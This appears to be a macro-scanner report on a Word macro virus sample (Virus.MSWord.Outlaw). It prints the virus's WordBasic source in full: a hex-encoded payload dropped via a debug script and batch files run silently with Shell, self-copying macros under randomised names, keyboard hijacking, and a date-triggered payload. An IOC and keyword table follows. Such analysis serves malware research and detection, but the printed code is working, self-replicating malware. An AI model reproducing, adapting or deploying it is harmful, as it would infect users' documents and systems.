Print #1, "E 0DD0 9A 31 FD 17 9B 1D 6F 03 AD 3A E1 6B 2A 96 88 D8"
Print #1, "E 0DE0 8A 55 89 3F DD 04 82 9F 12 68 4F AF 34 BC 0E FE"
Print #1, "E 0DF0 5B BD DE 4B BB 91 7F 9E 50 CC 5B DC D3 99 2B 5B"
Print #1, "E 0E00 0C 56 6F 97 DF FB 9A D9 00 59 FD F4 18 AD BE 4F"
Print #1, "E 0E10 00 F9 6D F1 A1 B5 6E 49 50 F2 5D 6B C2 99 10 24"
Print #1, "E 0E20 F1 54 FD AE 6F 09 EA 3D 02 69 6D EC C2 B1 6E F3"
Print #1, "E 0E30 E3 8A EE 0A 85 87 3F 05 8C D5 17 6C 53 95 DA E4"
Print #1, "E 0E40 86 33 32 A2 BA BF 21 94 AA 66 2E DF 01 C5 DD 61"
Print #1, "E 0E50 AC 77 9E 78 31 18 1E CC 69 B9 9B 63 4A 99 12 DB"
Print #1, "E 0E60 43 29 C3 7D 9D 8B EA 85 D8 73 9C 17 09 50 3E 02"
Print #1, "E 0E70 C6 D9 3E 43 5B 25 3D 31 10 9B 1D 5C C2 75 9B 77"
Print #1, "E 0E80 8C 48 02 41 F7 BF 0A C5 9D 4B 7E 3F 61 F7 6D 26"
Print #1, "E 0E90 05 92 2D 7E 4A D0 7C 3A 78 A2 1F 64 C2 BD 12 20"
Print #1, "E 0EA0 71 6E 7D 63 89 EA BB 9B 90 3F CD 15 A1 4C 8E 69"
Print #1, "E 0EB0 76 84 3C 15 00 9E 6C 05 80 5D 1F EC C9 BD 27 D8"
Print #1, "E 0EC0 AA 3B 8B 7F A5 66 C3 CE 8A 26 AD 49 AD A8 2C B0"
Print #1, "E 0ED0 33 DB 8C 1F 81 9B EC D7 E9 82 21 EC 31 9A 28 B3"
Print #1, "E 0EE0 37 66 0A 51 E0 9A E3 1F A8 5D 7D 83 28 8E FD EE"
Print #1, "E 0EF0 91 27 2C 8C 6B 13 7D AC F0 C9 9F E4 C1 79 0B A2"
Print #1, "E 0F00 12 05 B5 CA BF 77 28 FF EA 77 CC 46 6A 80 BC 35"
Print #1, "E 0F10 D3 26 EC 69 48 97 FC CC E2 68 DD EB C2 BD E8 60"
Print #1, "E 0F20 6C 7F CA 94 64 7B 83 95 6B 47 1D A6 B5 07 9C 47"
Print #1, "E 0F30 04 20 1B 91 2B 75 0B E8 2B CB"
Print #1, "RCX"
Print #1, "0E3A"
Print #1, "W"
Print #1, "Q"
Close 1

Open G$ + "Sounda.bat" For Output As 1
Print #1, "@echo off"
Print #1, "debug < " + G$ + "laugh.scr > nul"
Close 1

WordBasic.Shell G$ + "Sounda.bat", 0

n = WordBasic.Second(WordBasic.Now())
Timer_ = n + 25
If Timer_ > 59 Then Timer_ = Timer_ - 60
While WordBasic.Second(WordBasic.Now()) <> Timer_
Wend
WordBasic.Beep

Open G$ + "Rename.bat" For Output As 1
Print #1, "@echo off"
Print #1, "copy laugh.com laugh.wav"
Close 1

WordBasic.Shell G$ + "Rename.bat", 0

n = WordBasic.Second(WordBasic.Now())
Timer_ = n + 5
If Timer_ > 59 Then Timer_ = Timer_ - 60
While WordBasic.Second(WordBasic.Now()) <> Timer_
Wend
WordBasic.Beep

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO S7393.bas 
in file: Virus.MSWord.Outlaw-19c09bc2780731375f79ddf09886ec5de3de576c - OLE stream: 'Macros/VBA/S7393'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
Dim UZ$
Dim ZU$
Dim ZUZ$
Dim WordVer
Dim AL$
Dim AK$
On Error GoTo -1: On Error GoTo Finish

A$ = WordBasic.[FileName$]()
If A$ = "" Then GoTo Finish

UZ$ = WordBasic.[GetProfileString$]("Intl", "Name")
ZU$ = WordBasic.[GetProfileString$]("Intl", "Name2")
ZUZ$ = WordBasic.[GetProfileString$]("Intl", "Name3")

If CheckInstalledDoc = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    Routine
    Crypt
    PayloadMakro
    WordBasic.FileSaveAll 1, 0
End If

Finish:
A$ = WordBasic.[FileName$]()
If A$ = "" Then
    GoTo Finito
Else
    WordBasic.Insert "e"
End If
Finito:
If WordBasic.Month(WordBasic.Now()) = 1 And WordBasic.Day(WordBasic.Now()) = 20 Then
    GoTo Payload
Else
    GoTo NO
End If

Payload:
If (InStr(WordBasic.[AppInfo$](1), "Macintosh") > 0) Then GoTo NO
If (InStr(WordBasic.[AppInfo$](1), "Windows 3.") > 0) Then GoTo NO
If WordBasic.[Left$](WordBasic.[AppInfo$](2), 1) = "6" Then
    GoTo NO
Else
    GoTo YES
End If

YES:
WordVer = WordBasic.Val(WordBasic.[Left$](WordBasic.[AppInfo$](2), 1))
AL$ = Str(WordVer)
AL$ = WordBasic.[LTrim$](AL$)

If AL$ = "7" Then
    GoTo Payload_Start
Else
    GoTo NO
End If

Payload_Start:
AK$ = WordBasic.[GetProfileString$]("Intl", "Name3")
WordBasic.ToolsMacro Name:=AK$, Run:=1, Show:=0, Description:="", NewName:=""

NO:
End Sub

Private Sub Crypt()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim E$
Dim ZU$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

E$ = C$ + A$
ZU$ = WordBasic.[GetProfileString$]("Intl", "Name2")
WordBasic.MacroCopy "Global:" + ZU$, WordBasic.[WindowName$]() + ":" + E$
WordBasic.SetDocumentVar "VirNameDoc", E$
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:=E$, Add:=1, Context:=1
End Sub


Private Sub Routine()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim D$
Dim UZ$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

D$ = C$ + A$
UZ$ = WordBasic.[GetProfileString$]("Intl", "Name")
WordBasic.MacroCopy "Global:" + UZ$, WordBasic.[WindowName$]() + ":" + D$
WordBasic.SetDocumentVar "VirName", D$
WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:=D$, Add:=1, Context:=1
End Sub

Private Sub PayloadMakro()
Dim One
Dim Two
Dim Num
Dim A$
Dim Beginn
Dim B$
Dim C$
Dim K$
Dim ZUZ$
One = 7369
Two = 9291
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

Beginn = WordBasic.Hour(WordBasic.Now())
B$ = Str(Beginn)
B$ = WordBasic.[LTrim$](B$)

If B$ = "1" Then C$ = "A"
If B$ = "2" Then C$ = "B"
If B$ = "3" Then C$ = "C"
If B$ = "4" Then C$ = "D"
If B$ = "5" Then C$ = "E"
If B$ = "6" Then C$ = "F"
If B$ = "7" Then C$ = "G"
If B$ = "8" Then C$ = "H"
If B$ = "9" Then C$ = "I"
If B$ = "10" Then C$ = "J"
If B$ = "11" Then C$ = "K"
If B$ = "12" Then C$ = "L"
If B$ = "13" Then C$ = "M"
If B$ = "14" Then C$ = "N"
If B$ = "15" Then C$ = "O"
If B$ = "16" Then C$ = "P"
If B$ = "17" Then C$ = "Q"
If B$ = "18" Then C$ = "R"
If B$ = "19" Then C$ = "S"
If B$ = "20" Then C$ = "T"
If B$ = "21" Then C$ = "U"
If B$ = "22" Then C$ = "V"
If B$ = "23" Then C$ = "W"
If B$ = "00" Then C$ = "X"

K$ = C$ + A$
ZUZ$ = WordBasic.[GetProfileString$]("Intl", "Name3")
WordBasic.MacroCopy "Global:" + ZUZ$, WordBasic.[WindowName$]() + ":" + K$
WordBasic.SetDocumentVar "VirNamePayload", K$
End Sub

Private Function CheckInstalledDoc()
Dim CC$
Dim i
On Error Resume Next
CC$ = WordBasic.[GetDocumentVar$]("VirNameDoc")
    CheckInstalledDoc = 0
    If WordBasic.CountMacros(1) > 0 Then
        For i = 1 To WordBasic.CountMacros(1)
            If WordBasic.[MacroName$](i, 1) = CC$ Then
                CheckInstalledDoc = 1
            End If
        Next i
    End If
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |laugh.scr           |Executable file name                         |
|IOC       |Sounda.bat          |Executable file name                         |
|IOC       |Rename.bat          |Executable file name                         |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

